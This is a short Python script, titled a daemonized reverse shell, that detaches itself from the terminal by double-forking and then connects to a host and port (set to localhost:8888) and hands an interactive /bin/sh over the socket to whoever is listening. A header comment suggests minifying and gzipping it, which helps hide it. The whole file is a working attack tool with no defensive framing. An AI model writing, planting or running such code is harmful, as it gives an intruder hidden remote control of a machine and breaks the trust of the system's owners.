# Daemonized Python Reverse Shell
#
# To minify, use pyminifier:
# $ pyminifier --gzip prsd.py

import os
import socket
import subprocess
import sys

HOST='localhost'
PORT=8888

try:
    if os.fork() > 0:
        sys.exit
except OSError:
    sys.exit(1)
try:
    os.chdir('/')
    os.setsid()
    os.umask(0)
except OSError:
    if os.getpid() != os.getpgid(0):
        sys.exit(1)
try:
    if os.fork() > 0:
        sys.exit(0)
except OSError:
    sys.exit(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
subprocess.Popen('/bin/sh -i',
                 shell=True, 
                 stdout=s.fileno(), 
                 stderr=s.fileno(), 
                 stdin=s.fileno())
